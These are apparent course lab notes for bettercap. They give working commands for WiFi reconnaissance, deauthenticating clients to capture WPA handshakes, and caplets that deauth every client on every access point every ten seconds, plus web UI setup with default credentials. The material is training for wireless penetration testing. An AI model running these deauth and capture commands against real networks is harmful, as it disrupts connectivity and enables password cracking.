# Chapter 10 - bettercap

## Start
```
sudo apt install bettercap

sudo bettercap -iface wlan0

```

## Discover
```
wifi.recon on

wifi.recon.channel 6,11

set ticker.commands "clear; wifi.show"

wifi.recon on

ticker on  

```

## Show Clients
```
wifi.recon c6:2d:56:2a:53:f8

wifi.show

set wifi.show.filter ^c0

wifi.show

set wifi.show.filter ""

set wifi.rssi.min -49

wifi.show

```

## DeAuth a client
```
wifi.deauth c6:2d:56:2a:53:f8

wifi.deauth ac:22:0b:28:fd:22

wifi.recon off

get wifi.handshakes.file

set wifi.handshakes.file "/home/kali/handshakes/"

set wifi.handshakes.aggregate false

wifi.recon on

wifi.deauth c6:2d:56:2a:53:f8

wifi.deauth AA:BB:CC:DD:EE:FF

set wifi.deauth.skip ac:22:0b:28:fd:22

wifi.deauth c6:2d:56:2a:53:f8

```

## Caplets
```
cd /usr/share/bettercap/caplets/

cat -n massdeauth.cap

...
 1  set $ {by}{fw}{env.iface.name}{reset} {bold}» {reset}
 2
 3  # every 10 seconds deauth every client from every ap
 4  set ticker.period 10
 5  set ticker.commands clear; wifi.deauth ff:ff:ff:ff:ff:ff
 6
 7  # uncomment to only hop on these channels:
 8  # wifi.recon.channel 1,2,3
 9
10  wifi.recon on
11  ticker on
12  events.clear
13  clear
...

cat -n deauth_corp.cap

...
 1  set $ {br}{fw}{net.received.human} - {env.iface.name}{reset} » {reset}
 2
 3  set ticker.period 10
 4  set ticker.commands clear; wifi.show; events.show; wifi.deauth c6:2d:56:2a:53:f8
 5
 6  events.ignore wifi.ap.new
 7  events.ignore wifi.client.probe
 8  events.ignore wifi.client.new
 9
10  wifi.recon on
11  ticker on
12  events.clear
13  clear
...


sudo bettercap -iface wlan0 -caplet deauth_corp.cap

```

## Web Interface
```
sudo nft add table inet filter

sudo nft add chain inet filter INPUT { type filter hook input priority 0\; policy drop\; }

sudo nft add rule inet filter INPUT ip saddr 192.168.62.192 tcp dport 443 accept

sudo nft add rule inet filter INPUT ip saddr 192.168.62.192 tcp dport 8083 accept

cat -n /usr/share/bettercap/caplets/https-ui.cap

...
 1	# api listening on https://0.0.0.0:8083/ and ui on https://0.0.0.0
 2	set api.rest.address 0.0.0.0
 3	set api.rest.port 8083
 4	set https.server.address 0.0.0.0
 5	set https.server.port 443
 6
 7	# make sure both use the same https certificate so api requests won't fail
 8	set https.server.certificate ~/.bettercap-https.cert.pem
 9	set https.server.key ~/.bettercap-https.key.pem
10	set api.rest.certificate ~/.bettercap-https.cert.pem
11	set api.rest.key ~/.bettercap-https.key.pem
12	# default installation path of the ui
13	set https.server.path /usr/share/bettercap/ui
14
15	# !!! CHANGE THESE !!!
16	set api.rest.username offsec
17	set api.rest.password wifu
18
19	# go!
20	api.rest on
21	https.server on
...


sudo bettercap -iface wlan0 -caplet https-ui

```
